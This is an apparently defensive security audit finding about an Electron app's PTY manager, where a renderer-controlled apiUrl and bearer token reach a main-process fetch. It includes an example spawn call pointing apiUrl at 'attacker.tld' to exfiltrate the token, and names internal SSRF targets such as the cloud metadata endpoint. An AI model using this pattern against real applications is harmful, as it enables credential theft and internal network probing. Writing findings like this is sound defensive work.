# [HIGH] PTY `mcEnv.apiUrl` is renderer-controlled and used in main-process `fetch` (SSRF + token exfiltration)

**Files:** `electron/pty-manager.ts:121-136` (and the `mcEnv` capture in `pty:spawn` at `pty-manager.ts:250-336`)
**Category:** SSRF + credential leak
**Severity:** High

## What's wrong

`postSyntheticHook` does, from the main process:

```ts
fetch(`${p.mcEnv.apiUrl}/api/hooks/.../?taskId=${encodeURIComponent(p.taskId)}`, {
  headers: { authorization: `Bearer ${p.mcEnv.token}` },
});
```

`apiUrl` and `token` come straight from the renderer-supplied `mcEnv` on `pty:spawn`. The main process has no CORS and no origin guard, so it will happily POST to any URL the renderer chose, with the bearer token attached.

## Why fixing this is important — what could go wrong

A compromised renderer (finding 04) calls:

```js
window.electronAPI.pty.spawn({
  taskId: "x",
  cwd: "/some/project",
  command: "true",
  agent: "claude-code",
  mcEnv: { apiUrl: "http://attacker.tld", token: "<...>" },
});
```

Then it writes data into the PTY (`pty:write`) that matches the interrupt-pattern detection logic. MC sends `POST http://attacker.tld/api/hooks/claude?taskId=...` with `Authorization: Bearer <token>` and the JSON payload. That's:

1. **Bearer token exfiltrated to an attacker host.**
2. **SSRF from the trusted main process** to internal hosts the renderer normally can't reach: `http://127.0.0.1:<other-port>`, `http://169.254.169.254/` (AWS IMDS on a cloud dev VM), router admin panels at `http://192.168.1.1/`, etc.

## How to fix it

1. In `pty:spawn` (`electron/pty-manager.ts:250-336`), **discard** any renderer-supplied `mcEnv.apiUrl` and `mcEnv.token`. Override them with main-process-known values:
   - `apiUrl = \`http://127.0.0.1:${runtimePort}\`` (the same value the main process uses for `startProductionServer`)
   - `token = getOrCreateApiToken()` resolved in the main process
2. If a per-spawn one-time token is preferable, mint it in main and pass it via Electron IPC only — never via the HTTP body.
3. As defense-in-depth, in `postSyntheticHook`, parse `apiUrl` with `new URL` and assert `url.hostname === "127.0.0.1"` and `url.port === String(runtimePort)` before fetching.
4. Combine with finding 04 so a non-app frame can't drive `pty:spawn` at all.
